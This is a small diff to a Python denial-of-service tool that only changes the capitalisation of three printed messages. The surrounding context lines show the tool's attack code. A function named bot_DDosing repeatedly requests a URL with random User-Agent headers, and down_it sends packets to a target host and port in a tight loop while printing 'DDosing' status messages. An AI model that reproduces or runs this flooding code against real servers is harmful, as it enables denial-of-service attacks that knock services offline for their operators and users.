@@ -41,7 +41,7 @@ def bot_DDosing(url):
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-            print("\033[94mbot is DDosing...\033[0m")
+            print("\033[94mBot is DDosing...\033[0m")
             time.sleep(.1)
     except:
         time.sleep(.1)
@@ -58,7 +58,7 @@ def down_it(item):
                 print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet sent.DDosing!! \033[0m")
             else:
                 s.shutdown(1)
-                print("\033[91mshut<->down\033[0m")
+                print("\033[91mShut<->down\033[0m")
             time.sleep(.1)
     except socket.error as e:
         print("\033[91mno connection! server maybe down\033[0m")
@@ -130,7 +130,7 @@ if __name__ == '__main__':
         s.connect((host, int(port)))  # Connects to target's port
         s.settimeout(1)
     except socket.error as e:
-        print("\033[91mcheck server ip and port\033[0m")
+        print("\033[91mCheck server ip and port\033[0m")
         usage()
 
     while True:
